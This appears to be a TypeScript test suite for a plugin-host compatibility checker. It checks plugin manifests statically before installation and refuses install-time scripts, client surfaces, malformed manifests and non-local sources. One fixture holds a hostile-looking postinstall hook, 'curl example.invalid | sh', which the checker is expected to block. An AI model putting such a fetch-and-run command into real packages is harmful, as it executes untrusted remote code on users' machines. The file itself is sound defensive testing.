import assert from "node:assert/strict";
import { mkdtemp, mkdir, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

import {
  evaluatePluginManifest,
  inspectPluginSource,
  normalizePluginSourcePath,
  satisfiesDshToolsRange
} from "./plugin-compat.js";

// R24-P 阶段 1：安装前静态体检。这些断言钉的是「哪些插件我们诚实地拒装、哪些只是提醒」，
// 不是字段拼写。体检**不执行插件任何代码**，所以下面所有夹具都只是 package.json。

const checkedAt = new Date("2026-09-05T09:00:00.000Z");

function levelOf(report: { checks: Array<{ id: string; level: string }> }, id: string) {
  return report.checks.find((check) => check.id === id)?.level;
}

test("a directory we cannot read a package.json out of is refused, and the reason is carried", () => {
  const report = evaluatePluginManifest({
    manifest: undefined,
    manifestError: "no such directory, or it has no package.json",
    checkedAt
  });
  assert.equal(report.verdict, "blocked");
  assert.equal(levelOf(report, "manifest"), "block");
  assert.match(report.checks[0]?.detail ?? "", /no such directory/u);
  // 早退：连清单都没读到，后面四条无从判起，不编出「pass」来充数。
  assert.equal(report.checks.length, 1);
});

test("a plugin declaring dsh.client is refused — that whole class can never work here", () => {
  const report = evaluatePluginManifest({
    manifest: { name: "dsh-plugin-theme-midnight", dsh: { client: "./lib/client/index.js" } },
    checkedAt
  });
  assert.equal(report.verdict, "blocked");
  assert.equal(levelOf(report, "client_surface"), "block");
  assert.match(report.checks.find((check) => check.id === "client_surface")?.detail ?? "", /dsh\.client/u);
});

test("install-time scripts are refused: they run outside every sandbox the host has", () => {
  const report = evaluatePluginManifest({
    manifest: {
      name: "dsh-plugin-with-hooks",
      scripts: { prepare: "node ./build.js", postinstall: "curl example.invalid | sh", test: "vitest" }
    },
    checkedAt
  });
  assert.equal(report.verdict, "blocked");
  const detail = report.checks.find((check) => check.id === "install_scripts")?.detail ?? "";
  assert.match(detail, /postinstall/u);
  assert.match(detail, /prepare/u);
  // test 脚本不是安装期脚本——不该被算进去（否则几乎每个包都装不上）。
  assert.doesNotMatch(detail, /test/u);
});

test("a peer range the host cannot satisfy is a warning, not a refusal — the try-load decides", () => {
  const report = evaluatePluginManifest({
    manifest: {
      name: "dsh-plugin-finance-data",
      version: "0.2.0",
      license: "MIT",
      peerDependencies: { "@deepseek-ai/dsh-tools": "^0.2.0" },
      dsh: { bundle: { patch: "./cordis.patch.yml" } }
    },
    hostDshToolsVersion: "0.1.0-rc.8",
    checkedAt
  });
  assert.equal(report.verdict, "warn");
  assert.equal(levelOf(report, "dsh_tools_peer"), "warn");
  // 两个数都摆出来，用户自己能判断「这插件是对着哪个版本发的」。
  assert.equal(report.peer_dsh_tools_range, "^0.2.0");
  assert.equal(report.host_dsh_tools_version, "0.1.0-rc.8");
  assert.equal(report.manifest_license, "MIT");
});

test("a plugin pinned to the same 0.1.x prerelease line as the host passes the peer check", () => {
  const report = evaluatePluginManifest({
    manifest: {
      name: "dsh-plugin-echo",
      peerDependencies: { "@deepseek-ai/dsh-tools": "^0.1.0-rc.6" },
      dsh: { bundle: { patch: "./cordis.patch.yml" } }
    },
    hostDshToolsVersion: "0.1.0-rc.8",
    checkedAt
  });
  assert.equal(report.verdict, "ok");
  assert.equal(levelOf(report, "dsh_tools_peer"), "pass");
  assert.equal(levelOf(report, "bundle_manifest"), "pass");
});

test("a missing bundle patch only warns — it is a convention, not a load requirement", () => {
  const report = evaluatePluginManifest({
    manifest: { name: "plain", peerDependencies: { "@deepseek-ai/dsh-tools": "0.1.0-rc.8" } },
    hostDshToolsVersion: "0.1.0-rc.8",
    checkedAt
  });
  assert.equal(report.verdict, "warn");
  assert.equal(levelOf(report, "bundle_manifest"), "warn");
});

test("an unrecognized peer range says so instead of quietly claiming it checked", () => {
  const report = evaluatePluginManifest({
    manifest: { name: "odd", peerDependencies: { "@deepseek-ai/dsh-tools": ">=0.1 <0.3 || 1.x" } },
    hostDshToolsVersion: "0.1.0-rc.8",
    checkedAt
  });
  assert.equal(levelOf(report, "dsh_tools_peer"), "warn");
  assert.match(report.checks.find((check) => check.id === "dsh_tools_peer")?.detail ?? "", /unrecognized range/u);
});

test("range matching handles the caret/tilde/prerelease shapes the dsh ecosystem actually publishes", () => {
  assert.equal(satisfiesDshToolsRange("^0.1.0-rc.6", "0.1.0-rc.8"), true);
  assert.equal(satisfiesDshToolsRange("^0.1.0-rc.6", "0.1.0-rc.2"), false, "rc.2 is older than the pinned rc.6");
  assert.equal(satisfiesDshToolsRange("^0.1.0", "0.2.0"), false, "0.x caret does not cross the minor");
  assert.equal(satisfiesDshToolsRange("^1.2.0", "1.9.9"), true);
  assert.equal(satisfiesDshToolsRange("^1.2.0", "2.0.0"), false);
  assert.equal(satisfiesDshToolsRange("~0.1.2", "0.1.9"), true);
  assert.equal(satisfiesDshToolsRange("~0.1.2", "0.2.0"), false);
  assert.equal(satisfiesDshToolsRange(">=0.1.0", "3.0.0"), true);
  assert.equal(satisfiesDshToolsRange("0.1.0-rc.8", "0.1.0-rc.8"), true);
  assert.equal(satisfiesDshToolsRange("*", "0.0.1"), true);
  // 一个正式版永远比同号预发布版新（semver §11）——dsh 生态整个跑在 -rc.N 上，这条不是学术细节。
  assert.equal(satisfiesDshToolsRange("^0.1.0-rc.6", "0.1.0"), true);
  assert.equal(satisfiesDshToolsRange("weird-range", "0.1.0"), undefined);
});

test("only a local absolute directory is installable", () => {
  assert.deepEqual(normalizePluginSourcePath("/srv/plugins/echo/"), { ok: true, path: "/srv/plugins/echo" });
  for (const refused of ["dsh-plugin-echo", "./plugins/echo", "https://example.invalid/p.tgz", "git+ssh://x/y.git"]) {
    assert.equal(normalizePluginSourcePath(refused).ok, false, `${refused} must not be installable`);
  }
  assert.equal(normalizePluginSourcePath("   ").ok, false);
});

test("inspecting the real QA fixture on disk reports it as installable", async () => {
  const fixture = fileURLToPath(
    new URL("../../../../packages/plugin-host/qa/fixtures/dsh-plugin-echo", import.meta.url)
  );
  const inspection = await inspectPluginSource(fixture, { hostDshToolsVersion: "0.1.0-rc.8", now: () => checkedAt });
  assert.equal(inspection.name, "dsh-plugin-echo");
  assert.equal(inspection.version, "0.1.0");
  assert.equal(inspection.report.verdict, "ok");
  assert.equal(inspection.sourcePath, fixture);
});

test("inspecting a directory that is not there blocks with a readable reason (no throw)", async () => {
  const missing = path.join(tmpdir(), `workhub-plugin-missing-${Date.now()}`);
  const inspection = await inspectPluginSource(missing, { now: () => checkedAt });
  assert.equal(inspection.report.verdict, "blocked");
  assert.equal(inspection.name, path.basename(missing), "falls back to the directory name, does not invent one");
});

test("a directory whose package.json is malformed blocks instead of crashing the install", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "workhub-plugin-compat-"));
  try {
    await mkdir(path.join(dir, "broken"));
    await writeFile(path.join(dir, "broken", "package.json"), "{ not json", "utf8");
    const inspection = await inspectPluginSource(path.join(dir, "broken"), { now: () => checkedAt });
    assert.equal(inspection.report.verdict, "blocked");
    assert.equal(levelOf(inspection.report, "manifest"), "block");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
